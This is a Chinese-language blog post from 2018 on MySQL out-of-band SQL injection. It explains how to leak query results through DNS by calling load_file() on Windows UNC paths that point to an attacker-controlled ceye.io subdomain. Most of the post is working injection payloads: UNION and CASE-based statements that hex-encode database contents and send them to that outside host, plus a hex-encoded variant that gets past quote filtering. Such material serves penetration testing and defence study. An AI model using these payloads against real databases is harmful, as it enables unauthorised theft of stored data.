---
layout: post
title: "OOB注入(DNS外传)"
date:  ‎2018-02-13 19‎:‎28‎:‎13 +0800
categories: technology
tags: mysql dns
img: https://i.loli.net/2018/07/09/5b434692472ed.png
---
#关于mysql OOB注入的研究
## 应用场景：


 1.注入点无回显，只能靠盲注，但盲注太慢又不想等 =_=.
 2.mysql （Mysql版本>=5.5.53 ）开启文件导入导出
   可以用该语句判断`show global variables like '%secure%';`
           如果secure_file_priv值为null,则未开启，如果为空，则开启；如果为目录，说明只能导入导出该文件夹下内容。
 3.目标是windows系统（UNC路径） 基本利用语句：
'union select 1,load_file(concat('\\\\',(database()),'.g8vbmp.ceye.io\\abc')),3;'
----
##为什么要这样写？：
  1.在windows下，可以使用以下语句来访问UNC路径，即请求网络上的资源（主要在局域网中）**\\server\\resource**  又因为'\'为转义字符，需要重复输入达到转义自身的目的。***'\\\\' -->'\\'***
  2.load_file()函数可以访问计算机上的资源，也可以请求UNC路径，如果将需要查询的数据拼接到UNC路径当中，那么数据可以凭借服务器对特定资源的请求而被外带出去。
  3.既然数据已经有了外传的途径，那么只需在包含了数据的请求传输途中做手脚即可。服务器通信的基础是IP,而DNS提供了域名->IP的解析服务，我们将数据拼接在了域名中，DNS服务器势必就会接触到数据，所以数据外传的关键就是DNS。架设一台我们可控的DNS服务器并监听记录下传来的请求就能获取数据。
     附图一张，简述原理。
![Image.jpg](https://i.loli.net/2018/07/09/5b43474f61f4f.jpg)
####   PS:此处假设有3个字段，2为输出点，g8......为ceye.io申请的域名，database()处即为需要外传的查询语句。
#### PSS:很奇怪的是，version()可以外传，但user()却不能，一张包含title,content字段的表，只有title可以外传，content同样不行。
     ----
     经过摸索，初步得出结论，外传的数据中如果含有空格或特殊字符则无法外传。可以考虑hex。
     测试语句：
'''
    1.union select 1,load_file(concat("\\\\",(select hex(content) from pentest.news limit 1,1),'.g8vbmp.ceye.io\\abc')),3
    2.id =(case when (1=1) then (select load_file(concat('\\\\',(select database()),'.g8vbmp.ceye.io\\qw'))) else 1*(select 1 from dual union select 2 from dual) end);'

 可以绕过单双引号过滤的语句：
id =11 union select 1,load_file(concat(0x5c5c,(select hex(content) from pentest.news limit 1,1),0x2e6675636b6766772e636579652e696f5c5c61626378)),3;

'''
奇怪的是，这些语句只能用一次，第二次再使用就失效了
